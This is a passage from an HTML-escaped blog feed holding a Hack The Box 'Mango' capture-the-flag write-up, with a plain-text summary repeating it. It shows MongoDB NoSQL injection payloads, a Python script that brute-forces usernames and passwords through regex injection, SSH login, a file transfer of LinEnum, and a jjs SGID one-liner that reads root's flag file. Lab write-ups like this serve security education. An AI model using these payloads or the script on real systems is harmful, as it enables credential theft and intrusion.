class=&quot;s&quot;&gt;'^'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'+'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;amp;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'|'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;this way will skip letter ‘a’ so we can enumerate the first letter of the another target account. Note: if you suspect that there is another account that start with ‘a’ but not admin. you can escape letter ‘d’ instead of ‘a’ for enumeratation.&lt;/p&gt;

&lt;p&gt;running the script after tweaking it we get.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we see that ‘&lt;strong&gt;m&lt;/strong&gt;’ is the first letter. Now lets tweak the script another time. Will remove ‘&lt;strong&gt;a&lt;/strong&gt;’ from
line # 34&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'?'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'^'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'+'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;amp;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'|'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and modify &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data1&lt;/code&gt; variable and add &lt;strong&gt;‘m’&lt;/strong&gt; as a value for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username=&lt;/code&gt; parameters.&lt;/p&gt;

&lt;p&gt;line # 25 should look like this&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;data1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;username[$regex]=^m&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;password[$ne]=&amp;amp;login=login&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and the result is:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so know we have two account names &lt;strong&gt;admin&lt;/strong&gt; and &lt;strong&gt;mango&lt;/strong&gt;. Now with extraction of passwords. Will tweak the script to fit our needs in this case.
in line#25 we will modify &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data1&lt;/code&gt; variable to the following:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;data1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;username=admin&amp;amp;password[$regex]=^&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;login=login&quot;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;by this modification we are injecting password parameter instead of username and we hardcoded the username to search for the associated password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;checking out the result. And a successful login.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;running the script with &lt;strong&gt;mango&lt;/strong&gt; hardcoded as username.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;initial-foothold--user-own&quot;&gt;Initial Foothold &amp;amp; User Own&lt;/h1&gt;
&lt;p&gt;lets try these creds to ssh in the box.
ssh &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mango@10.10.10.162&lt;/code&gt; and enter the password when prompt.&lt;/p&gt;

&lt;p&gt;&lt;span style=&quot;color:grey&quot;&gt;Admin account didnt have ssh login.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;once we are in the box as mango, will look around for juicy stuff.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mango@mango:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mango:x:1000:1000:mango:/home/mango:/bin/bash
admin:x:4000000000:1001:,,,:/home/admin/:/bin/sh
mongodb:x:111:65534::/home/mongodb:/usr/sbin/nologin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Since there is &lt;strong&gt;*admin&lt;/strong&gt; username in the box. lets try &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su - admin&lt;/code&gt; and the creds found earlier.&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mango@mango:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su - admin
      
Password: 
      
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
      
&lt;/span&gt;admin
      
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nice we got in with admin and it looks like admin have &lt;strong&gt;user.txt&lt;/strong&gt; in home directory.
Now we should run linux enumeration script such as &lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;&lt;strong&gt;LinEnum.sh&lt;/strong&gt;&lt;/a&gt;, but we have to download it in our machine first, then move the script to mango box with following commands.&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;in mango box we can use &lt;strong&gt;wget&lt;/strong&gt; also to download it from our machine&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://10.10.YOUR.IP/LinEnum.sh
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x LinEnum.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and run the script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./LinEnum.sh&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;privilege-escalation--root-own&quot;&gt;Privilege Escalation &amp;amp; Root Own&lt;/h1&gt;
&lt;p&gt;Looking at the output from &lt;strong&gt;LinEnum.sh&lt;/strong&gt; we see that there is &lt;strong&gt;SGID&lt;/strong&gt; (Set Group ID) binary named ‘&lt;strong&gt;jjs&lt;/strong&gt;’ looks vulnerable.
Let me introduce you to a great webpage &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFObin&lt;/a&gt; that makes binary exploitation much easier. Search for jjs and you can see many methods of how to abuse SGID on &lt;strong&gt;jjs&lt;/strong&gt;.
Here is one way of doing that, will just read the root.txt from root home directory.&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);
var FileReader = Java.type(&quot;java.io.FileReader&quot;);
var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));
while ((line = br.readLine()) != null) { print(line); }'&lt;/span&gt; | jjs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;lets run the above commands, and we should get &lt;strong&gt;root.txt&lt;/strong&gt; printed out for us.&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);
      
var FileReader = Java.type(&quot;java.io.FileReader&quot;);
      
var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));

while ((line = br.readLine()) != null) { print(line); }'&lt;/span&gt; | jjs&amp;gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
      
Warning: The jjs tool is planned to be removed from a future JDK release

jjs&amp;gt; var BufferedReader &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Java.type&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;java.io.BufferedReader&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

jjs&amp;gt; var FileReader &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Java.type&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;java.io.FileReader&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      
jjs&amp;gt; var br &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new BufferedReader&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new FileReader&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/root/root.txt&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

jjs&amp;gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;line &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; br.readLine&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; null&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; print&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;line&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;****************&lt;/span&gt;81688424e9ab15ab15
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Thanks for reading.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>GitHub User</name></author><category term="Hack The Box" /><category term="HTB" /><category term="Mango" /><summary type="html">Brief Summary Hello, this is my first writeup and it’s going to be about HackTheBox: Mango machine. The box is retired now which means we can talk about it publicly. I personally enjoyed playing mango machine, I learned new stuff and had fun. Nmap Starting off, with nmap to get an idea about the machine and the services running. nmap 10.10.10.162 -A will provide us with os detection, versions of serviecs running if applicable and traceroute of the target. Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 20:40 +03 Nmap scan report for 10.10.10.162 Host is up (0.096s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA) | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA) |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 403 Forbidden 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Mango | Search Base | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN | Not valid before: 2019-09-27T14:21:19 |_Not valid after: 2020-09-26T14:21:19 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.15 seconds from the output of nmap, we can note that there is a web application running on port 80/443 and has a certificate with a domain name registered as staging-order.mango.htb Enumeration when i visited port 80 i got Forbidden response from server. So i visited port 443 instead. but the page didnt load completely, the broweser notified me for connection not secured, which is weird. So i looked to into the certificate and found this domain staging-order.mango.htb mango that got caught previously with nmap. i accepted the risk and continued. The page loaded completely: the search engine doesn’t work yet. and ‘Analytics’ was a rabit hole believe me. i spent hours and got put with nothing. lets start burp suite, and intrecpt the traffic. First thing i will do, is to add the hostname resolution rule in burp -&amp;gt; project options -&amp;gt; connections. this time i visited the new domain, and found a login page. intresting… lots of mangos appearently. the machine name and these pictures. Lets fuzz the login page little bit with different sql injection techniques. We should also include NoSql. Since you know, MongoDB is one of popular Databases and the box name is some how rhyme with it. NoSql Injection &amp;amp; More Enumeratation lets capture the login request with Burp Suite, and send it to repteater. After trying many things, and looking online for useful articles about slqi on MongoDB. Found this article. And The way to inject the parameters will be like original POST data: username=admin&amp;amp;password=&amp;amp;login=login injected with NoSql attack: username[$ne]=admin&amp;amp;password[$ne]=&amp;amp;login=login By using [$ne] we specify that stored data in the DB should not be equal to our input. here we have a redirection. following that a successful login. but it looks like the page is not completed yet and it has username/email admin@mango.htb . Anyway lets enumerate more usernames. By using [$regex] we tell the server to use ‘Regular Expressing’ for our input and search for it in the database. Enumerating the login page with username[$regex]=^a&amp;amp;password[$ne]=&amp;amp;login=login as POST data that gets send to the server with payload of ^ to specify the search for the first letter only, and a because it is the begining of ‘admin’ account. and it looks like we have a successful login too. lets try ‘d’ . the response status code was not 302 (redirection). Meaning that there is no account name that starts with ‘d’ in our case. We can enumrate letter by letter or we can automate this with python. Here a python script that will enumerate usernames. Note: i routed the script traffic to Burp Suite through localhost port 8080 for debugging purposes. If you are not using burp please remove the lines from 6-14 1 # python3 nosql-enum.py 2 import requests 3 import re 4 import os 5 6 #================================================= 7 # to send this script traffic through Burp Suite 8 proxy = 'http://localhost:8080' 9 10 os.environ['http_proxy'] = proxy 11 os.environ['HTTP_PROXY'] = proxy 12 os.environ['https_proxy'] = proxy 13 os.environ['HTTPS_PROXY'] = proxy 14 # ================================================= 15 16 url = 'http://staging-order.mango.htb' 17 cookies = 'PHPSESSID=' 18 19 chars = range(33, 127) 20 21 p1 = '' 22 23 24 def rqst(p1): 25 data1 = &quot;username[$regex]=^&quot;+p1+&quot;&amp;amp;password[$ne]=&amp;amp;login=login&quot; 26 r = requests.post(url, data=data1, verify=False, allow_redirects=False, 27 headers={'Content-Type': 'application/x-www-form-urlencoded'}) 28 29 if r.status_code == 302: 30 P1 = p1 31 print('\nfound so far: ' + p1) 32 33 for i in chars: 34 if chr(i) in ['.','?','*','^','+','&amp;amp;','|']: 35 p1 = P1 +'\\'+ chr(i) # to escape chars 36 rqst(p1) 37 else: 38 p1 = P1 + chr(i) 39 print('\r'+p1, flush=False, end='') 40 if len(p1) &amp;gt;=4: 41 x = re.search(&quot;.*\$\$$&quot;, p1) # exit condition if $ (end of line) was found will exit and print the string without $ 42 if x: 43 print('\n\nthis is the string: ' + p1[:-2]) 44 exit() 45 46 rqst(p1) 47 return 48 49 50 print(rqst(p1)) running with script python3 we get the following account name admin as expected Now lets tweak the script little bit to be able to find another username. First thing we should add , ‘a’ in line 34 just like this if chr(i) in ['.','?','*','^','+','&amp;amp;','|','a']: this way will skip letter ‘a’ so we can enumerate the first letter of the another target account. Note: if you suspect that there is another account that start with ‘a’ but not admin. you can escape letter ‘d’ instead of ‘a’ for enumeratation. running the script after tweaking it we get. we see that ‘m’ is the first letter. Now lets tweak the script another time. Will remove ‘a’ from line # 34 if chr(i) in ['.','?','*','^','+','&amp;amp;','|','a']: and modify data1 variable and add ‘m’ as a value for username= parameters. line # 25 should look like this data1 = &quot;username[$regex]=^m&quot;+p1+&quot;&amp;amp;password[$ne]=&amp;amp;login=login&quot; and the result is: so know we have two account names admin and mango. Now with extraction of passwords. Will tweak the script to fit our needs in this case. in line#25 we will modify data1 variable to the following: data1 = &quot;username=admin&amp;amp;password[$regex]=^&quot;+p1+&quot;&amp;amp;login=login&quot; by this modification we are injecting password parameter instead of username and we hardcoded the username to search for the associated password. checking out the result. And a successful login. running the script with mango hardcoded as username. Initial Foothold &amp;amp; User Own lets try these creds to ssh in the box. ssh mango@10.10.10.162 and enter the password when prompt. Admin account didnt have ssh login. once we are in the box as mango, will look around for juicy stuff. mango@mango:~$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mango:x:1000:1000:mango:/home/mango:/bin/bash admin:x:4000000000:1001:,,,:/home/admin/:/bin/sh mongodb:x:111:65534::/home/mongodb:/usr/sbin/nologin Since there is *admin username in the box. lets try su - admin and the creds found earlier. mango@mango:~$ su - admin Password: $ whoami admin $ Nice we got in with admin and it looks like admin have user.txt in home directory. Now we should run linux enumeration script such as LinEnum.sh, but we have to download it in our machine first, then move the script to mango box with following commands. wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh python3 -m http.server 80 in mango box we can use wget also to download it from our machine $ wget http://10.10.YOUR.IP/LinEnum.sh $ chmod +x LinEnum.sh and run the script ./LinEnum.sh Privilege Escalation &amp;amp; Root Own Looking at the output from LinEnum.sh we see that there is SGID (Set Group ID) binary named ‘jjs’ looks vulnerable. Let me introduce you to a great webpage GTFObin that makes binary exploitation much easier. Search for jjs and you can see many methods of how to abuse SGID on jjs. Here is one way of doing that, will just read the root.txt from root home directory. echo 'var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;); var FileReader = Java.type(&quot;java.io.FileReader&quot;); var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;)); while ((line = br.readLine()) != null) { print(line); }' | jjs lets run the above commands, and we should get root.txt printed out for us. $ echo 'var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;); var FileReader = Java.type(&quot;java.io.FileReader&quot;); var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;)); while ((line = br.readLine()) != null) { print(line); }' | jjs&amp;gt; &amp;gt; &amp;gt; Warning: The jjs tool is planned to be removed from a future JDK release jjs&amp;gt; var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;); jjs&amp;gt; var FileReader = Java.type(&quot;java.io.FileReader&quot;); jjs&amp;gt; var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;)); jjs&amp;gt; while ((line = br.readLine()) != null) { print(line); } ****************81688424e9ab15ab15 Thanks for reading.</summary></entry></feed>